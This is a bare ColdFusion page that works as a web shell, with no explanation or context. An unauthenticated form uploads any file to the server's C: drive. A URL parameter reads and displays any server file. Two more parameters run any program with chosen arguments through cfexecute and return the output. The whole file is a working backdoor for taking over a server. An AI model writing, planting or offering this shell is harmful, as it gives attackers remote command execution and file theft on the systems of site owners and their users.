<html>
<body>
  
<cfoutput>
 
<cfif isDefined("fileUpload")>
  <cffile action="upload"
    fileField="fileUpload"
    destination="C:\">
     <p>Your file has been uploaded.</p>
</cfif>
<form enctype="multipart/form-data" method="post">
<input type="file" name="fileUpload" /><br />
<input type="submit" value="Upload File" />
</form>
 
 
<cfif isdefined("url.f")>
<cfset myx = url.f />
<cffile action="read"
	file="#myx#"
	variable="datahere">
<pre>
<cfoutput>#HTMLCodeFormat(datahere)#</cfoutput>
</pre>
</cfif>
<cfif isdefined("url.y")>

<cfexecute name = "#url.y#"
  arguments = "#url.o#"
  timeout = "20" variable="myy">
</cfexecute>
<pre>
<cfoutput>#myy#</cfoutput>
</pre>
</cfif>
</cfoutput>
</body>
</html>
